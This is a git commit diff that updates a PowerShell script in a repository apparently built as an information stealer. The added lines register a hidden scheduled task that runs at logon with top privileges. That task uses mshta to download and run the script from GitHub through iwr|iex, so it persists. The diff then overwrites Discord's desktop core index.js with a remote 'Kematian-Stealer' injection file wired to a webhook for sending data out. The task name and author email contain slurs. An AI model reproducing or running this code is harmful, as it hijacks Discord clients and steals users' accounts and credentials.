00cf67426cb9d24a743a3b6923ad149fb3e87462
43a1723 <hai1723notgay@gmail.com>
2024-06-27 18:48:19 +0700

    Update main.ps1

--- file/main.ps1
+++ file/main.ps1
@@ -1,5 +1,39 @@
 $webhook = "YOUR_WEBHOOK_HERE"
-# Địa chỉ IP và cổng của server
+
+$task_name = "account6666niiggggagay"
+New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/main.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
+Write-Host "[!] Persistence Added" -ForegroundColor Green
+
+$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+
+foreach ($path in $discPaths) {
+    $skibidipath = Join-Path $locAppData $path
+    if (-not (Test-Path $skibidipath)) {
+        continue
+    }
+    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+            $files = Get-ChildItem $_.FullName
+            foreach ($file in $files) {
+                if ($file.Name -eq "index.js") {
+                    $webClient = New-Object System.Net.WebClient
+                    $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
+                    if ($content -ne "") {
+                        $replacedContent = $content -replace "%WEBHOOK%", $webhook
+                        $replacedContent | Set-Content -Path $file.FullName -Force
+                    }
+                }
+            }
+        }
+    }
+}
+
+Write-Host "[!] Discord injection" -ForegroundColor blue
+
 $serverIp = "127.0.0.1"
 $port = 8666
 
